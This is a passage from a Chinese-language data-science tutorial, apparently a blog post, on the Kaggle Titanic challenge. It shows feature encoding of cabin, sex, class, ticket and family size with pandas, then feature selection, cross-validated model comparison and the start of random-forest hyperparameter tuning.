class="built_in">map</span>(<span class="keyword">lambda</span> c: c[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dummy encoding ...</span></span><br><span class="line">    cabin_dummies = pd.get_dummies(combined[<span class="string">&#x27;Cabin&#x27;</span>], prefix=<span class="string">&#x27;Cabin&#x27;</span>)</span><br><span class="line">    combined = pd.concat([combined, cabin_dummies], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    combined.drop(<span class="string">&#x27;Cabin&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">    status(<span class="string">&#x27;cabin&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>此函数将 <code>NaN</code> 值替换为 U（表示 <em>Unknow</em> ）。 然后它将每个 <code>Cabin</code> 值映射到第一个字母。然后它再次使用虚拟编码对舱位值进行编码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_cabin()</span><br></pre></td></tr></table></figure><pre><code>Processing cabin : ok</code></pre><p>好了，没有缺失值了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Title_Master</th>      <th>Title_Miss</th>      <th>Title_Mr</th>      <th>Title_Mrs</th>      <th>Title_Officer</th>      <th>Title_Royalty</th>      <th>Embarked_C</th>      <th>Embarked_Q</th>      <th>Embarked_S</th>      <th>Cabin_A</th>      <th>Cabin_B</th>      <th>Cabin_C</th>      <th>Cabin_D</th>      <th>Cabin_E</th>      <th>Cabin_F</th>      <th>Cabin_G</th>      <th>Cabin_T</th>      <th>Cabin_U</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>  </tbody></table><h3><span id="chu-li-xing-bie-sex">处理性别（Sex）</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_sex</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># mapping string values to numerical one</span></span><br><span class="line">    combined[<span class="string">&#x27;Sex&#x27;</span>] = combined[<span class="string">&#x27;Sex&#x27;</span>].<span class="built_in">map</span>(&#123;<span class="string">&#x27;male&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;female&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line">    status(<span class="string">&#x27;Sex&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>此函数将字符串值 <code>male</code> 和 <code>female</code> 分别映射到1和0。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_sex()</span><br></pre></td></tr></table></figure><pre><code>Processing Sex : ok</code></pre><h3><span id="chu-li-cheng-ke-deng-ji-pclass">处理乘客等级（Pclass）</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_pclass</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># encoding into 3 categories:</span></span><br><span class="line">    pclass_dummies = pd.get_dummies(combined[<span class="string">&#x27;Pclass&#x27;</span>], prefix=<span class="string">&quot;Pclass&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># adding dummy variable</span></span><br><span class="line">    combined = pd.concat([combined, pclass_dummies],axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># removing &quot;Pclass&quot;</span></span><br><span class="line">    combined.drop(<span class="string">&#x27;Pclass&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    status(<span class="string">&#x27;Pclass&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>此函数使用虚拟编码对 Pclass（1,2,3）的值进行编码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_pclass()</span><br></pre></td></tr></table></figure><pre><code>Processing Pclass : ok</code></pre><h3><span id="chu-li-chuan-piao-hao-ma-ticket">处理船票号码（Ticket）</span></h3><p>让我们首先看看我们的数据集中不同的船票号码前缀</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cleanTicket</span>(<span class="params">ticket</span>):</span><br><span class="line">    ticket = ticket.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ticket = ticket.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ticket = ticket.split()</span><br><span class="line">    ticket = <span class="built_in">map</span>(<span class="keyword">lambda</span> t : t.strip(), ticket)</span><br><span class="line">    ticket = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> t : <span class="keyword">not</span> t.isdigit(), ticket))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ticket) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> ticket[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;XXX&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tickets = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> combined[<span class="string">&#x27;Ticket&#x27;</span>]:</span><br><span class="line">    tickets.add(cleanTicket(t))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(tickets)</span><br></pre></td></tr></table></figure><pre><code>37</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_ticket</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a function that extracts each prefix of the ticket, returns &#x27;XXX&#x27; if no prefix (i.e the ticket is a digit)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cleanTicket</span>(<span class="params">ticket</span>):</span><br><span class="line">        ticket = ticket.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        ticket = ticket.replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        ticket = ticket.split()</span><br><span class="line">        ticket = <span class="built_in">map</span>(<span class="keyword">lambda</span> t : t.strip(), ticket)</span><br><span class="line">        ticket = <span class="built_in">filter</span>(<span class="keyword">lambda</span> t : <span class="keyword">not</span> t.isdigit(), ticket)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ticket) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> ticket[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;XXX&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extracting dummy variables from tickets:</span></span><br><span class="line"></span><br><span class="line">    combined[<span class="string">&#x27;Ticket&#x27;</span>] = combined[<span class="string">&#x27;Ticket&#x27;</span>].<span class="built_in">map</span>(cleanTicket)</span><br><span class="line">    tickets_dummies = pd.get_dummies(combined[<span class="string">&#x27;Ticket&#x27;</span>], prefix=<span class="string">&#x27;Ticket&#x27;</span>)</span><br><span class="line">    combined = pd.concat([combined, tickets_dummies], axis=<span class="number">1</span>)</span><br><span class="line">    combined.drop(<span class="string">&#x27;Ticket&#x27;</span>, inplace=<span class="literal">True</span>, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    status(<span class="string">&#x27;Ticket&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_ticket()</span><br></pre></td></tr></table></figure><pre><code>Processing Ticket : ok</code></pre><h3><span id="chu-li-jia-ting">处理家庭</span></h3><p>这部分包括根据家庭的大小创建新变量（大小是我们创建的另一个变量）。</p><p>这种新变量的创建是在一个现实的假设下完成的：大家庭聚集在一起，因此他们比单独旅行的人更有可能获救。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_family</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># introducing a new feature : the size of families (including the passenger)</span></span><br><span class="line">    combined[<span class="string">&#x27;FamilySize&#x27;</span>] = combined[<span class="string">&#x27;Parch&#x27;</span>] + combined[<span class="string">&#x27;SibSp&#x27;</span>] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># introducing other features based on the family size</span></span><br><span class="line">    combined[<span class="string">&#x27;Singleton&#x27;</span>] = combined[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s: <span class="number">1</span> <span class="keyword">if</span> s == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">    combined[<span class="string">&#x27;SmallFamily&#x27;</span>] = combined[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s: <span class="number">1</span> <span class="keyword">if</span> <span class="number">2</span> &lt;= s &lt;= <span class="number">4</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">    combined[<span class="string">&#x27;LargeFamily&#x27;</span>] = combined[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s: <span class="number">1</span> <span class="keyword">if</span> <span class="number">5</span> &lt;= s <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    status(<span class="string">&#x27;family&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>此函数引入了4个新特征：</p><ul><li><code>FamilySize</code>：包括乘客（他/她）自己在内的亲属总数。</li><li><code>Sigleton</code>：描述 size = 1 的家庭的布尔变量</li><li><code>SmallFamily</code>：一个布尔变量，描述 2 &lt;= size &lt;= 4 的家庭</li><li><code>LargeFamily</code>：一个布尔变量，描述 5 &lt; size 的家庭</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_family()</span><br></pre></td></tr></table></figure><pre><code>Processing family : ok</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> combined.shape</span><br></pre></td></tr></table></figure><pre><code>(1309, 67)</code></pre><p>最后我们得到了67个特征。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Fare</th>      <th>Title_Master</th>      <th>Title_Miss</th>      <th>Title_Mr</th>      <th>Title_Mrs</th>      <th>Title_Officer</th>      <th>Title_Royalty</th>      <th>Embarked_C</th>      <th>Embarked_Q</th>      <th>Embarked_S</th>      <th>Cabin_A</th>      <th>Cabin_B</th>      <th>Cabin_C</th>      <th>Cabin_D</th>      <th>Cabin_E</th>      <th>Cabin_F</th>      <th>Cabin_G</th>      <th>Cabin_T</th>      <th>Cabin_U</th>      <th>Pclass_1</th>      <th>Pclass_2</th>      <th>Pclass_3</th>      <th>Ticket_A</th>      <th>Ticket_A4</th>      <th>Ticket_A5</th>      <th>Ticket_AQ3</th>      <th>Ticket_AQ4</th>      <th>Ticket_AS</th>      <th>Ticket_C</th>      <th>Ticket_CA</th>      <th>Ticket_CASOTON</th>      <th>Ticket_FC</th>      <th>Ticket_FCC</th>      <th>Ticket_Fa</th>      <th>Ticket_LINE</th>      <th>Ticket_LP</th>      <th>Ticket_PC</th>      <th>Ticket_PP</th>      <th>Ticket_PPP</th>      <th>Ticket_SC</th>      <th>Ticket_SCA3</th>      <th>Ticket_SCA4</th>      <th>Ticket_SCAH</th>      <th>Ticket_SCOW</th>      <th>Ticket_SCPARIS</th>      <th>Ticket_SCParis</th>      <th>Ticket_SOC</th>      <th>Ticket_SOP</th>      <th>Ticket_SOPP</th>      <th>Ticket_SOTONO2</th>      <th>Ticket_SOTONOQ</th>      <th>Ticket_SP</th>      <th>Ticket_STONO</th>      <th>Ticket_STONO2</th>      <th>Ticket_STONOQ</th>      <th>Ticket_SWPP</th>      <th>Ticket_WC</th>      <th>Ticket_WEP</th>      <th>Ticket_XXX</th>      <th>FamilySize</th>      <th>Singleton</th>      <th>SmallFamily</th>      <th>LargeFamily</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>1</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>7.2500</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>2</td>      <td>0</td>      <td>1</td>      <td>0</td>    </tr>    <tr>      <th>1</th>      <td>0</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>71.2833</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>2</td>      <td>0</td>      <td>1</td>      <td>0</td>    </tr>    <tr>      <th>2</th>      <td>0</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>7.9250</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>3</th>      <td>0</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>53.1000</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>2</td>      <td>0</td>      <td>1</td>      <td>0</td>    </tr>    <tr>      <th>4</th>      <td>1</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>8.0500</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>1</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>  </tbody></table><h2><span id="iii-mo-xing">III - 模型</span></h2><p>在这一部分中，我们根据我们创建的特征建立统计模型。您可以将此模型视为一个盒子，它可以处理任何新乘客的信息，并决定他是否能够幸存。</p><p>有各种各样的模型可供使用，从逻辑回归到决策树，以及更复杂的模型，如随机森林和梯度提升树。</p><p>我们将使用随机森林。Random Froests 在 Kaggle 比赛中证明了很高的有效性。</p><p>有关为什么集合方法表现良好的更多详细信息，您可以参考这些帖子：</p><ul><li><a href="http://mlwave.com/kaggle-ensembling-guide/">http://mlwave.com/kaggle-ensembling-guide/</a></li><li><a href="http://www.overkillanalytics.net/more-is-always-better-the-power-of-simple-ensembles/">http://www.overkillanalytics.net/more-is-always-better-the-power-of-simple-ensembles/</a></li></ul><p>回到我们的问题，我们现在必须：</p><p>1.将组合数据集分成训练集和测试集。2.使用训练集建立预测模型。3.使用训练集评估模型。4.使用测试集测试模型，并生成并输出提交文件。</p><p>请记住，我们必须重复 2 和 3 直到达到可接受的评估分数。</p><p>让我们首先导入需要用到的函数包。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> make_pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble.gradient_boosting <span class="keyword">import</span> GradientBoostingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectKBest</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> StratifiedKFold</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectFromModel</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression, LogisticRegressionCV</span><br></pre></td></tr></table></figure><p>为了评估我们的模型，我们将使用5折交叉验证（5-fold cross validation），因为它是在比赛排行榜中使用的指标。</p><p>为此，我们将定义一个小的评分函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compute_score</span>(<span class="params">clf, X, y, scoring=<span class="string">&#x27;accuracy&#x27;</span></span>):</span><br><span class="line">    xval = cross_val_score(clf, X, y, cv = <span class="number">5</span>, scoring=scoring)</span><br><span class="line">    <span class="keyword">return</span> np.mean(xval)</span><br></pre></td></tr></table></figure><p>从组合数据集中恢复训练集和测试集是一项简单的任务。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">recover_train_test_target</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line"></span><br><span class="line">    targets = pd.read_csv(<span class="string">&#x27;./data/train.csv&#x27;</span>, usecols=[<span class="string">&#x27;Survived&#x27;</span>])[<span class="string">&#x27;Survived&#x27;</span>].values</span><br><span class="line">    train = combined.iloc[:<span class="number">891</span>]</span><br><span class="line">    test = combined.iloc[<span class="number">891</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> train, test, targets</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train, test, targets = recover_train_test_target()</span><br></pre></td></tr></table></figure><h3><span id="te-zheng-xuan-ze">特征选择</span></h3><p>到目前为止，我们已经提出了30多个特征。这个数字非常大。</p><p>在完成特征工程时，我们通常倾向于通过选择捕获基本特征的“正确”数量的特征来减少维度。</p><p>事实上，特征选择带来许多好处：</p><ul><li>它减少了数据之间的冗余</li><li>它加快了训练过程</li><li>它减少过拟合</li></ul><p>基于树的估算器可用于计算特征重要性，而这些重要性又可用于丢弃不相关的特征。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">clf = RandomForestClassifier(n_estimators=<span class="number">50</span>, max_features=<span class="string">&#x27;sqrt&#x27;</span>)</span><br><span class="line">clf = clf.fit(train, targets)</span><br></pre></td></tr></table></figure><p>让我们看看每个特征的重要性。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">features = pd.DataFrame()</span><br><span class="line">features[<span class="string">&#x27;feature&#x27;</span>] = train.columns</span><br><span class="line">features[<span class="string">&#x27;importance&#x27;</span>] = clf.feature_importances_</span><br><span class="line">features.sort_values(by=[<span class="string">&#x27;importance&#x27;</span>], ascending=<span class="literal">True</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">features.set_index(<span class="string">&#x27;feature&#x27;</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">features.plot(kind=<span class="string">&#x27;barh&#x27;</span>, figsize=(<span class="number">25</span>, <span class="number">25</span>))</span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.axes._subplots.AxesSubplot at 0x117ff2a10&gt;</code></pre><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/8.png" alt="png"></p><p>正如您可能注意到的那样，与 <code>Title_Mr</code>，<code>Age</code>，<code>Fare</code> 和 <code>Sex</code> 相关联非常重要。</p><p>与 <code>Passenger_Id</code> 也有重要的相关性。</p><p>现在让我们将我们的训练集和测试集转换为更紧凑的数据集。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = SelectFromModel(clf, prefit=<span class="literal">True</span>)</span><br><span class="line">train_reduced = model.transform(train)</span><br><span class="line"><span class="built_in">print</span> train_reduced.shape</span><br></pre></td></tr></table></figure><pre><code>(891, 12)</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_reduced = model.transform(test)</span><br><span class="line"><span class="built_in">print</span> test_reduced.shape</span><br></pre></td></tr></table></figure><pre><code>(418, 12)</code></pre><p>好极了！ 现在我们的特征减少了很多。</p><p>我们将看看我们是否会使用训练集的减少版或完整版。</p><h3><span id="rang-wo-men-chang-shi-bu-tong-de-ji-chu-mo-xing">让我们尝试不同的基础模型</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logreg = LogisticRegression()</span><br><span class="line">logreg_cv = LogisticRegressionCV()</span><br><span class="line">rf = RandomForestClassifier()</span><br><span class="line">gboost = GradientBoostingClassifier()</span><br><span class="line"></span><br><span class="line">models = [logreg, logreg_cv, rf, gboost]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> models:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Cross-validation of : &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(model.__class__)</span><br><span class="line">    score = compute_score(clf=model, X=train_reduced, y=targets, scoring=<span class="string">&#x27;accuracy&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;CV score = &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(score)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;****&#x27;</span></span><br></pre></td></tr></table></figure><pre><code>Cross-validation of : &lt;class 'sklearn.linear_model.logistic.LogisticRegression'&gt;CV score = 0.818195097715****Cross-validation of : &lt;class 'sklearn.linear_model.logistic.LogisticRegressionCV'&gt;CV score = 0.81818240172****Cross-validation of : &lt;class 'sklearn.ensemble.forest.RandomForestClassifier'&gt;CV score = 0.808183171282****Cross-validation of : &lt;class 'sklearn.ensemble.gradient_boosting.GradientBoostingClassifier'&gt;CV score = 0.824917697684****</code></pre><h3><span id="chao-can-shu-diao-zheng">超参数调整</span></h3><p>正如建模部分的开头所提到的，我们将使用随机森林模型。它可能不是这项任务的最佳模型，但我们将展示如何调整。这项工作可以应用于不同的模型。</p><p>随机森林非常方便。然而，它们会带有一些参数进行调整，以便为预测任务获得最佳模型。</p><p>要了解有关随机森林的更多信息，请参阅此 <a href="https://www.analyticsvidhya.com/blog/2015/06/tuning-random-forest-model/">链接</a>。</p><p>此外，我们将使用全部训练集。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># turn run_gs to True if you want to run the gridsearch again.</span></span><br><span class="line">run_gs = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> run_gs:</span><br><span class="line">    parameter_grid = &#123;</span><br><span class="line">                 <span class="string">&#x27;max_depth&#x27;</span> : [<span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>],</span><br><span class="line">                 <span class="string">&#x27;n_estimators&#x27;</span>: [<span class="number">50</span>, <span class="number">10</span>],</span><br><span class="line">                 <span class="string">&#x27;max_features&#x27;</span>: [<span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;auto&#x27;</span>, <span class="string">&#x27;log2&#x27;</span>],</span><br><span class="line">                 <span class="string">&#x27;min_samples_split&#x27;</span>: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>],</span><br><span class="line">                 <span 